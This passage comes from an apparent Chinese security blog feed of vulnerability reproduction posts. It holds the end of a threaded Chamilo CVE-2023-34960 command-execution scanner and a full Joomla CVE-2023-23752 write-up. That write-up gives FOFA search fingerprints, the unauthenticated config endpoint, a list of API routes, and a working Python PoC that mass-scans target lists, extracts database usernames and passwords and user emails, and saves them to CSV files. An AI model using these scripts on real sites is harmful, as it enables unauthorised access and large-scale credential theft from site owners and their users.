class="string">&quot;r&quot;</span>) <span class="keyword">as</span> url_file:</span><br><span class="line">            urls = url_file.readlines()</span><br><span class="line">            urls = [url.strip() <span class="keyword">if</span> url.startswith((<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>)) <span class="keyword">else</span> url.strip() <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line">    <span class="keyword">elif</span> args.url:</span><br><span class="line">        urls = [args.url]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.error(<span class="string">f&quot;<span class="subst">&#123;FR&#125;</span>Whut are you doin bro?&quot;</span>)</span><br><span class="line"></span><br><span class="line">    max_workers = args.threads</span><br><span class="line"></span><br><span class="line">    user_agents = users_agents()</span><br><span class="line"></span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=max_workers) <span class="keyword">as</span> executor:</span><br><span class="line">        futures = [executor.submit(chamilo, url, command, user_agents) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> future, url <span class="keyword">in</span> <span class="built_in">zip</span>(futures, urls):</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                results.append((url, result))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;FY&#125;</span>[CVE-2023-34960] - <span class="subst">&#123;FW&#125;</span><span class="subst">&#123;url&#125;</span> - <span class="subst">&#123;FR&#125;</span>[Failed!] - <span class="subst">&#123;FC&#125;</span>Not Vulnerable<span class="subst">&#123;Style.RESET_ALL&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.output:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">for</span> url, result <span class="keyword">in</span> results:</span><br><span class="line">                file.write(<span class="string">f&quot;URL: <span class="subst">&#123;url&#125;</span>\nResult: Results/<span class="subst">&#123;result&#125;</span>\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】Joomla未授权访问漏洞CVE-2023-23752</title>
    <url>/2023/03/26/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Joomla%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9ECVE-2023-23752/</url>
    <content><![CDATA[<h1 id="【漏洞复现】Joomla未授权访问漏洞-CVE-2023-23752"><a href="#【漏洞复现】Joomla未授权访问漏洞-CVE-2023-23752" class="headerlink" title="【漏洞复现】Joomla未授权访问漏洞|CVE-2023-23752"></a>【漏洞复现】Joomla未授权访问漏洞|CVE-2023-23752</h1><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p><strong>Jooml 在海外使用较多，是一套使用 PHP 和 MySQL 开发的开源、跨平台的内容管理系统(CMS)。</strong><br><strong>Joomla 4.0.0 至 4.2.7 版本中的 ApiRouter.php#parseApiRoute 在处理用户的 Get 请求时未对请求参数有效过滤，导致攻击者可向 Joomla 服务端点发送包含 public=true 参数的请求(如：/api/index.php/v1/config/application?public=true&amp;key=value) 进行未授权访问</strong></p>
<h1 id="fofa指纹"><a href="#fofa指纹" class="headerlink" title="fofa指纹"></a>fofa指纹</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;Joomla!4&quot;</span><br><span class="line"></span><br><span class="line">product=&quot;Joomla&quot;</span><br></pre></td></tr></table></figure>

<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>4.0.0 &lt;= Joomla &lt;= 4.2.7</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>/api/index.php/v1/config/application?public=true</p>
<p>我们可以直接看到数据库的配置信息。</p>
<p><img src="/2023/03/26/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Joomla%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9ECVE-2023-23752/image-20230326132054439.png" alt="image-20230326132054439"></p>
<h2 id="其他可利用接口"><a href="#其他可利用接口" class="headerlink" title="其他可利用接口"></a>其他可利用接口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/clients/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/categories/:id</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/banners/:id/contenthistory/keep</span><br><span class="line">v1/banners/:id/contenthistory</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/application</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/config/:component_name</span><br><span class="line">v1/contacts/form/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/contacts/:id/contenthistory/keep</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/content/articles/:id/contenthistory/keep</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/extensions</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/overrides/search</span><br><span class="line">v1/languages/overrides/search/cache/refresh</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages</span><br><span class="line">v1/languages</span><br><span class="line">v1/media/adapters</span><br><span class="line">v1/media/adapters/:id</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path/</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/site/items/types</span><br><span class="line">v1/menus/administrator/items/types</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/modules/types/site</span><br><span class="line">v1/modules/types/administrator</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/plugins</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/requests/:id</span><br><span class="line">v1/privacy/requests/export/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/consents</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels/:id</span><br></pre></td></tr></table></figure>

<h2 id="poc脚本"><a href="#poc脚本" class="headerlink" title="poc脚本"></a>poc脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line">proxy = &#123;&#125;</span><br><span class="line">notColor = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inGreen</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\033[0;32m&#123;&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inYellow</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\033[0;33m&#123;&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readFile</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    file = <span class="built_in">open</span>(filepath, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> file.readlines()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span>(<span class="params">filepath, data</span>):</span></span><br><span class="line">    file = <span class="built_in">open</span>(filepath, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    filecsv = csv.writer(file)</span><br><span class="line">    filecsv.writerow(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reqDatabase</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">if</span> url.rindex(<span class="string">&quot;/&quot;</span>) == <span class="built_in">len</span>(url) - <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">&quot;&#123;&#125;api/index.php/v1/config/application?public=true&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">&quot;&#123;&#125;/api/index.php/v1/config/application?public=true&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line"></span><br><span class="line">    payload = &#123;&#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.request(<span class="string">&quot;GET&quot;</span>, url, headers=headers, data=payload, verify=<span class="literal">False</span>, proxies=proxy, timeout=timeout)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;links&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">&quot;\&quot;password\&quot;:&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rejson = json.loads(response.text)</span><br><span class="line">            user = <span class="string">&quot;&quot;</span></span><br><span class="line">            password = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> dataone <span class="keyword">in</span> rejson[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">                <span class="comment"># print(dataone[&#x27;attributes&#x27;])</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;user&quot;</span> <span class="keyword">in</span> dataone[<span class="string">&#x27;attributes&#x27;</span>]:</span><br><span class="line">                    user = dataone[<span class="string">&#x27;attributes&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> dataone[<span class="string">&#x27;attributes&#x27;</span>]:</span><br><span class="line">                    password = dataone[<span class="string">&#x27;attributes&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> user != <span class="string">&quot;&quot;</span> <span class="keyword">or</span> password != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                printBody = <span class="string">&quot;[+] [Database]   &#123;&#125; --&gt; &#123;&#125; / &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, user, password)</span><br><span class="line">                <span class="keyword">if</span> notColor:</span><br><span class="line">                    <span class="built_in">print</span>(printBody)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(inYellow(printBody))</span><br><span class="line">                <span class="keyword">if</span> output.strip() != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                    writeFile(output + <span class="string">&quot;_databaseUserAndPassword.csv&quot;</span>, [url, user, password, response.text])</span><br><span class="line">            <span class="keyword">return</span> url, response.text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reqUserAndEmail</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">if</span> url.rindex(<span class="string">&quot;/&quot;</span>) == <span class="built_in">len</span>(url) - <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">&quot;&#123;&#125;api/index.php/v1/users?public=true&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">&quot;&#123;&#125;/api/index.php/v1/users?public=true&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line"></span><br><span class="line">    payload = &#123;&#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.request(<span class="string">&quot;GET&quot;</span>, url, headers=headers, data=payload, verify=<span class="literal">False</span>, proxies=proxy, timeout=timeout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">&quot;email&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rejson = json.loads(response.text)</span><br><span class="line">            <span class="keyword">for</span> dataone <span class="keyword">in</span> rejson[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">                username = <span class="string">&quot;&quot;</span></span><br><span class="line">                email = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="comment"># print(dataone[&#x27;attributes&#x27;])</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">in</span> dataone[<span class="string">&#x27;attributes&#x27;</span>]:</span><br><span class="line">                    username = dataone[<span class="string">&#x27;attributes&#x27;</span>][<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;email&quot;</span> <span class="keyword">in</span> dataone[<span class="string">&#x27;attributes&#x27;</span>]:</span><br><span class="line">                    email = dataone[<span class="string">&#x27;attributes&#x27;</span>][<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> username != <span class="string">&quot;&quot;</span> <span class="keyword">or</span> email != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                    printBody = <span class="string">&quot;[+] [User&amp;email] &#123;&#125; --&gt; &#123;&#125; / &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, username, email)</span><br><span class="line">                    <span class="keyword">if</span> notColor:</span><br><span class="line">                        <span class="built_in">print</span>(printBody)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(inGreen(printBody))</span><br><span class="line">                    <span class="keyword">if</span> output.strip() != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        writeFile(output + <span class="string">&quot;_usernameAndEmail.csv&quot;</span>, [url, username, email, response.text])</span><br><span class="line">            <span class="keyword">return</span> url, response.text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reqs</span>(<span class="params">listfileName</span>):</span></span><br><span class="line">    urls = readFile(listfileName)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        url = url.strip()</span><br><span class="line">        <span class="keyword">if</span> url == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        reqDatabase(url)</span><br><span class="line">        reqUserAndEmail(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;测试目标的 URL&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listfile&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;测试目标的地址文件&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;输出文件的位置&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--proxy&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;代理，如：http://localhost:1080&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-nc&#x27;</span>, <span class="string">&#x27;--notColor&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&quot;禁止带颜色的输出，如：-nc true&quot;</span>)</span><br><span class="line"></span><br><span class="line">    opt = parser.parse_args()</span><br><span class="line">    args = <span class="built_in">vars</span>(opt)</span><br><span class="line">    url = args[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    urlFileName = args[<span class="string">&#x27;listfile&#x27;</span>]</span><br><span class="line">    <span class="keyword">global</span> output, proxy, notColor</span><br><span class="line">    output = args[<span class="string">&#x27;output&#x27;</span>]</span><br><span class="line">    proxy[<span class="string">&#x27;http&#x27;</span>] = args[<span class="string">&#x27;proxy&#x27;</span>]</span><br><span class="line">    proxy[<span class="string">&#x27;https&#x27;</span>] = args[<span class="string">&#x27;proxy&#x27;</span>]</span><br><span class="line">    notColor = args[<span class="string">&#x27;notColor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        reqDatabase(url)</span><br><span class="line">    <span class="keyword">if</span> urlFileName != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        reqs(urlFileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】Smartbi内置用户登陆绕过漏洞复现</title>
    <url>/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
